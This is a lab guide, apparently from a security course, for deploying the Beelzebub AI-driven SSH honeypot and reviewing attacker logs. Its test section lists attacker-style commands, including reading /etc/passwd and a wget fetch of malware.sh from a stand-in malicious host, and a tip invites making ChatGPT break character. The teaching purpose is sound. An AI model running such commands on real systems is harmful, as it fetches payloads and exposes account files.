![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)


**Beelzebub** is an advanced honeypot framework designed to provide a highly secure environment for detecting and analyzing cyber attacks. It offers a low code approach for easy implementation and uses AI to mimic the behavior of a high-interaction honeypot

>[!IMPORTANT]
>
>You can find the original GitHub of at [Beelzebub Repo](https://github.com/mariocandela/beelzebub)

# Setup
Participants will deploy and monitor an AI-powered SSH honeypot (Beelzebub) to detect and analyze attacker behavior in real time

```bash
sudo su -
```
```bash
apt update && apt upgrade -y
```
```bash
systemctl enable --now docker
```
- Enter the password for all the **authentications**

<img width="1066" height="521" alt="image" src="https://github.com/user-attachments/assets/86180983-e24d-496d-80e1-a4d9eac995ac" />


```bash
cd /opt
```
```bash
git clone https://github.com/mariocandela/beelzebub.git
```

### Get the ChatGPT Api Key
- Go to [ChatGPT](https://chatgpt.com/) and create an account if you don’t have one
- Make sure you have credits or a payment method at [Billing Setting](https://platform.openai.com/settings/organization/billing/overview)
- Go to [API Keys](https://platform.openai.com/api-keys) and create a new key
- Save this key as you will only see it once!

### Deployment
- Make sure you are into **/opt/beelzebub/**

```bash
cd /opt/beelzebub/
```

```bash
nano docker-compose.yml
```
 - Put your key here at `OPEN_AI_SECRET_KEY: `
<img width="295" height="53" alt="image" src="https://github.com/user-attachments/assets/eca9345f-c69c-45f2-8a00-5cf389e42b3b" />


- Also comment the **Default SSH Mapping**(ssh 22 port) by putting a `#` anywhere before it in the same line
<img width="176" height="81" alt="image" src="https://github.com/user-attachments/assets/f02190d4-36ec-4638-8817-aae8a33ece43" />

- Save and leave the editor with `Ctrl + X` + `Y` + `Enter`

```bash
cd configurations/services/
```
```bash
mv ./ssh-22.yaml ~
```
```bash
nano ./ssh-2222.yaml
```
 - Add your key with double quotes around it like `OPENAI_API_KEY: "your_api_key_here"`

<img width="329" height="26" alt="image" src="https://github.com/user-attachments/assets/97cf551d-f9c8-4d7a-b575-b423e8c1b74e" />

 - Save and leave the editor with `Ctrl + X` + `Y` + `Enter`

```bash
cd /opt/beelzebub/
```
```bash
docker-compose build
```
```bash
docker-compose up -d
```

# Try it
Connect to it like this:

```bash
ssh -p 2222 root@127.0.0.1
``` 
- use password "**1234**"
- Try using any commands like **ls** or **id**
<img width="659" height="126" alt="image" src="https://github.com/user-attachments/assets/914c1f89-c3d0-412d-bae6-7b9fcee70d9e" />

Everything you see is AI generated, and that's what an attacker would see

Cool, right?

- Try running suspicious commands an attacker would use
```bash
uname -a
```
```bash
cat /etc/passwd
```
```bash
wget http://malicious.example/malware.sh
```
```bash
id
```
Now exit the session to export the logs

```bash
cd /opt/beelzebub/
```
```bash
docker-compose logs -f
```
```bash
docker-compose logs > honeypot.log
```

Take your time into analyzing the logs and seeing how they are being built

>[!TIP]
>
>Try to make ChatGPT break character, this method, like anything else in cybersecurity isn't flawless, but it surely tricks hackers and does its job, **to increase Attack Time**



***                                                                 
<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/ADHD/)</i></b>

<b><i>Want to go back? </br>[Previous Lab](/IntroClassFiles/Tools/IntroClass/ADHD/)</i></b>

<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---


